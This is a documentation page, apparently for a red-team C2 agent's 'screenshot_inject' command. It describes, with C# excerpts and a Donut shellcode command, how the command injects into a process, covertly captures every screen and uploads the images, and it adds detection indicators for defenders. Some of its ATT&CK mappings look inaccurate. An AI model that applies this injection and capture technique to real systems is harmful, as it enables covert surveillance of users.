+++
title = "screenshot_inject"
chapter = false
weight = 103
hidden = false
+++

{{% notice info %}}
Artifacts Generated: Process Inject
{{% /notice %}}

## Summary
Injects a screenshot capture assembly into a target process to capture desktop sessions from that process's security context. Uses process injection, named pipes for IPC, and supports multiple screenshots with configurable intervals. Bypasses session isolation by executing in the context of the target process.

- **Needs Admin:** False (depends on target process privileges)
- **Version:** 2
- **Author:** @reznok, @djhohnstein

### Arguments
- **pid** (Number, Required) - Process ID to inject screenshot assembly into
- **count** (Number, Optional) - Number of screenshots to capture (default: 1)
- **interval** (Number, Optional) - Seconds between screenshots (default: 0)

## Usage
```
screenshot_inject -PID 1234
screenshot_inject -PID 1234 -Count 5 -Interval 2
screenshot_inject -PID 2048 -Count 10 -Interval 1
```

**Output:**
```
Process injection artifact generated for PID 1234
Multiple JPEG screenshot files uploaded to Mythic:
- Screenshot 1: 1920x1080 desktop capture
- Screenshot 2: 1920x1080 desktop capture (2 seconds later)
- Screenshot 3: 1920x1080 desktop capture (4 seconds later)
```

## Detailed Summary

### Agent Execution Flow

#### 1. Parameter Processing and Validation
```csharp
[DataContract]
internal struct ScreenshotInjectParameters
{
    [DataMember(Name = "pipe_name")] public string PipeName;
    [DataMember(Name = "count")] public int Count;
    [DataMember(Name = "interval")] public int Interval;
    [DataMember(Name = "loader_stub_id")] public string LoaderStubId;
    [DataMember(Name = "pid")] public int PID;
}

ScreenshotInjectParameters parameters = _jsonSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
```
- Deserializes injection parameters from JSON
- Validates required parameters (PID, pipe name, loader stub ID)
- Sets default values for optional parameters (count=1, interval=0)
- Generates unique named pipe identifier for IPC communication

#### 2. Target Process Validation
```csharp
bool pidRunning = false;
try
{
    System.Diagnostics.Process.GetProcessById(parameters.PID);
    pidRunning = true;
}
catch
{
    pidRunning = false;
}

if (!pidRunning)
{
    resp = CreateTaskResponse($"Process with ID {parameters.PID} is not running.", true, "error");
}
```
- Verifies target process exists and is running
- Uses `Process.GetProcessById()` for validation
- Provides clear error message if process not found
- Prevents injection attempts into non-existent processes

#### 3. Assembly Building and Shellcode Generation
```csharp
// Python command builder - builds ScreenshotInject.exe
shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/ScreenshotInject/ScreenshotInject.csproj"

// Donut shellcode generation
command = "{} -f 1 -p \"{}\" {}".format(donutPath, taskData.args.get_arg("pipe_name"), SCREENSHOT_INJECT)
```
- Builds standalone ScreenshotInject.exe using .NET compiler
- Uses Donut loader to convert executable to position-independent shellcode
- Embeds named pipe name as parameter for IPC communication
- Optimizes build for release (no debug symbols, x64 platform)

#### 4. Process Injection Execution
```csharp
if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
{
    var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
    if (injector.Inject())
    {
        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "", 
            new IMythicMessage[] { Artifact.ProcessInject(parameters.PID, 
                _agent.GetInjectionManager().GetCurrentTechnique().Name) }));
    }
}
```
- Downloads shellcode from Mythic file system
- Creates injection instance targeting specified PID
- Executes injection using Apollo's injection manager
- Generates process injection artifact for logging
- Supports multiple injection techniques (configurable)

#### 5. Named Pipe Communication Setup
```csharp
AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
client.ConnectionEstablished += Client_ConnectionEstablished;
client.MessageReceived += OnAsyncMessageReceived;
client.Disconnect += Client_Disconnect;

if (client.Connect(10000))
{
    IPCCommandArguments cmdargs = new IPCCommandArguments
    {
        ByteData = new byte[0],
        StringData = string.Format("{0} {1}", count, interval)
    };
    
    IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
    foreach (IPCChunkedData chunk in chunks)
    {
        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
    }
}
```
- Establishes named pipe connection to injected process
- Uses 10-second connection timeout
- Sends configuration parameters (count, interval) to injected assembly
- Implements chunked message protocol for large data transfers
- Handles connection events asynchronously

#### 6. Injected Assembly Screenshot Logic
```csharp
// Inside injected ScreenshotInject.exe
public static byte[][] GetScreenshots()
{
    List<byte[]> bshots = new List<byte[]>();
    foreach(Screen sc in Screen.AllScreens)
    {
        byte[] bScreen = GetBytesFromScreen(sc);
        bshots.Add(bScreen);
    }
    return bshots.ToArray();
}

private static byte[] GetBytesFromScreen(Screen screen)
{
    using (Bitmap bmpScreenCapture = new Bitmap(screen.Bounds.Width, screen.Bounds.Height))
    {
        using (Graphics g = Graphics.FromImage(bmpScreenCapture))
        {
            g.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, 0, 0, 
                bmpScreenCapture.Size, CopyPixelOperation.SourceCopy);
            using (MemoryStream ms = new MemoryStream())
            {
                bmpScreenCapture.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                return ms.ToArray();
            }
        }
    }
}
```
- Executes in target process's security context
- Captures all screens using `Screen.AllScreens`
- Uses `Graphics.CopyFromScreen()` for pixel capture
- Encodes screenshots as JPEG for smaller file size
- Sends data back through named pipe to parent process

#### 7. Asynchronous Data Handling
```csharp
private Action<object> _sendAction;
private Action<object> _putFilesAction;
private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
private ConcurrentQueue<byte[]> _putFilesQueue = new ConcurrentQueue<byte[]>();
private AutoResetEvent _senderEvent = new AutoResetEvent(false);
private AutoResetEvent _putFilesEvent = new AutoResetEvent(false);

_putFilesAction = (object p) =>
{
    while (!_cancellationToken.IsCancellationRequested && !_completed)
    {
        WaitHandle.WaitAny(new WaitHandle[] { _putFilesEvent, _cancellationToken.Token.WaitHandle, _complete });
        if (_putFilesQueue.TryDequeue(out byte[] screen))
        {
            ST.Task<bool> uploadTask = new ST.Task<bool>(() =>
            {
                return _agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, 
                    screen, null, out string mythicFileId, true);
            });
            uploadTasks.Add(uploadTask);
            uploadTask.Start();
        }
    }
};
```
- Implements producer-consumer pattern for data processing
- Uses concurrent queues for thread-safe operations
- Handles sending commands to injected process
- Manages file uploads to Mythic asynchronously
- Supports cancellation through cancellation tokens

#### 8. Chunked Message Protocol
```csharp
private void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
{
    IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
        Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
    
    lock (MessageStore)
    {
        if (!MessageStore.ContainsKey(chunkedData.ID))
        {
            MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
            MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
        }
    }
    MessageStore[chunkedData.ID].AddMessage(chunkedData);
}

private void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
{
    List<byte> data = new List<byte>();
    for (int i = 0; i < args.Chunks.Length; i++)
    {
        data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
    }
    
    IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
    if (msg.GetTypeCode() == MessageType.ScreenshotInformation)
    {
        _putFilesQueue.Enqueue(((ScreenshotInformation)msg).Data);
        _putFilesEvent.Set();
    }
}
```
- Handles large screenshot data through chunked protocol
- Reconstructs messages from multiple chunks
- Uses message store to track incomplete messages
- Validates message types for security
- Processes screenshot data for file upload

#### 9. Multi-Screenshot Coordination
```csharp
// Injected assembly loop (pseudocode)
for (int i = 0; i < count; i++)
{
    byte[][] screenshots = Screenshot.GetScreenshots();
    foreach (byte[] screenshot in screenshots)
    {
        SendScreenshotOverPipe(screenshot);
    }
    
    if (i < count - 1 && interval > 0)
    {
        Thread.Sleep(interval * 1000);
    }
}
```
- Supports multiple screenshot capture cycles
- Implements configurable intervals between captures
- Captures all monitors in each cycle
- Maintains timing accuracy across multiple screenshots

### Donut Shellcode Integration

#### Position-Independent Code Generation
```bash
donut -f 1 -p "pipe_name" ScreenshotInject.exe
```
- **Format 1**: Raw shellcode output
- **Parameter Passing**: Named pipe name embedded in shellcode
- **Architecture**: x64 position-independent code
- **Bypass**: Avoids file-based detection

#### Shellcode Execution Flow
1. **Memory Allocation**: Allocates RWX memory in target process
2. **Code Injection**: Writes shellcode to allocated memory
3. **Execution**: Creates thread to execute injected code
4. **Parameter Resolution**: Resolves embedded pipe name at runtime
5. **Library Loading**: Dynamically loads required .NET runtime
6. **Assembly Execution**: Runs screenshot capture logic

### Inter-Process Communication

#### Named Pipe Architecture
```csharp
// Pipe naming convention
string pipeName = Guid.NewGuid().ToString(); // Unique per injection

// Bidirectional communication
AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", pipeName);
```
- Uses unique GUID-based pipe names
- Supports bidirectional communication
- Implements timeout mechanisms
- Handles connection failures gracefully

#### Message Protocol
```csharp
public class IPCChunkedData
{
    public string ID { get; set; }        // Message identifier
    public int Index { get; set; }        // Chunk sequence number
    public bool IsComplete { get; set; }  // Final chunk indicator
    public string Data { get; set; }      // Base64-encoded payload
    public MessageType Message { get; set; } // Message type
}
```
- Supports large data transfers through chunking
- Uses Base64 encoding for binary data
- Implements message reconstruction logic
- Provides error detection and recovery

### Security Context Considerations

#### Process Token Inheritance
- **Desktop Access**: Inherits target process's desktop session
- **User Context**: Executes with target process's user privileges
- **Session Isolation**: Bypasses session 0 isolation on Windows services
- **Integrity Level**: Maintains target process's integrity level

#### Privilege Escalation Scenarios
```csharp
// Injection into higher-privilege process
if (targetProcess.HasHigherPrivileges())
{
    // Screenshot capture gains elevated context
    // May access secure desktops
    // Can capture admin-only applications
}
```

### Performance and Resource Management

#### Memory Usage Optimization
```csharp
// Efficient memory management in injected process
using (Bitmap bmpScreenCapture = new Bitmap(screen.Bounds.Width, screen.Bounds.Height))
{
    using (Graphics g = Graphics.FromImage(bmpScreenCapture))
    {
        using (MemoryStream ms = new MemoryStream())
        {
            // Immediate disposal of resources
            bmpScreenCapture.Save(ms, ImageFormat.Jpeg);
            return ms.ToArray();
        }
    }
}
```
- Uses `using` statements for automatic resource disposal
- Processes screenshots sequentially to minimize memory footprint
- Implements JPEG compression to reduce data size
- Cleans up GDI+ resources immediately

#### Network and File Transfer
```csharp
ST.Task<bool> uploadTask = new ST.Task<bool>(() =>
{
    return _agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, 
        screen, null, out string mythicFileId, true);
}, _cancellationToken.Token);
```
- Uploads screenshots asynchronously to prevent blocking
- Uses cancellation tokens for task management
- Implements error handling for failed uploads
- Provides progress feedback through intermediate responses

## APIs Used
| API | Purpose | DLL/Namespace |
|-----|---------|---------------|
| `Process.GetProcessById` | Validate target process | System.Diagnostics |
| `Graphics.CopyFromScreen` | Capture screen pixels | System.Drawing |
| `Screen.AllScreens` | Enumerate displays | System.Windows.Forms |
| `NamedPipeClientStream` | IPC communication | System.IO.Pipes |
| `Bitmap.Save` | Image encoding | System.Drawing |
| `CreateRemoteThread` | Thread creation (injection) | kernel32.dll |
| `VirtualAllocEx` | Memory allocation (injection) | kernel32.dll |
| `WriteProcessMemory` | Memory writing (injection) | kernel32.dll |

## MITRE ATT&CK Mapping
- **T1113** - Screen Capture
- **T1055** - Process Injection
- **T1055.001** - Process Injection: Dynamic-link Library Injection
- **T1129** - Shared Modules
- **T1559.001** - Inter-Process Communication: Component Object Model

## Security Considerations
- **Process Injection**: Injects code into arbitrary processes
- **Privilege Escalation**: May gain higher privileges through target process
- **Session Bypass**: Circumvents session isolation mechanisms
- **Memory Manipulation**: Direct memory writing in target process
- **Desktop Access**: Captures sensitive information from target session
- **Steganography**: Screenshot data could hide additional payloads
- **Forensic Evasion**: Avoids file-based detection through in-memory execution

## Defensive Detection

### Process Injection Indicators
- **Unusual Memory Patterns**: RWX memory allocations in target process
- **Cross-Process API Calls**: `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`
- **Thread Creation**: `CreateRemoteThread` in foreign process
- **Module Loading**: Unexpected .NET runtime loading in non-.NET processes

### Network and IPC Monitoring
- **Named Pipe Creation**: Unusual pipe names or patterns
- **Large Data Transfers**: Significant outbound data from screenshot uploads
- **Process Communication**: Unexpected IPC between processes
- **Network Connections**: HTTP/HTTPS uploads to suspicious destinations

### Behavioral Analysis
- **Graphics API Usage**: Unusual `CopyFromScreen` patterns
- **Memory Usage Spikes**: Temporary memory increases during capture
- **Process Relationships**: Parent-child process analysis
- **File System Activity**: Temporary file creation patterns

## Limitations
1. **Process Architecture**: Must match target process architecture (x86/x64)
2. **Injection Restrictions**: Some processes protected by security software
3. **Session Requirements**: Target process must have active desktop session
4. **Graphics Access**: Requires target process to have graphics capabilities
5. **Memory Constraints**: Large screenshots may cause memory pressure
6. **Network Dependencies**: Requires reliable connection for file uploads
7. **Timing Accuracy**: Intervals may drift under high system load
8. **Process Lifetime**: Injection fails if target process terminates

## Error Conditions
- **Process Not Found**: Target PID does not exist or has terminated
- **Injection Failed**: Cannot inject into target process (permissions, protection)
- **Pipe Connection Failed**: Named pipe communication establishment failure
- **Assembly Load Failed**: Cannot load screenshot assembly in target process
- **Graphics Access Denied**: Target process lacks desktop/graphics access
- **Memory Allocation Failed**: Insufficient memory for screenshot capture
- **File Upload Failed**: Network or file system errors during upload
- **Timeout Expired**: Operations exceed configured timeout values
- **Cancellation Requested**: User or system cancellation of operation

## Special Thanks
Reznok wrote the Apollo 1.X version of this module. You can find him at the following:

Social | Handle
-------|-------
Github|https://github.com/reznok
Twitter|[@reznok](https://twitter.com/rezn0k)
BloodHoundGang Slack|@reznok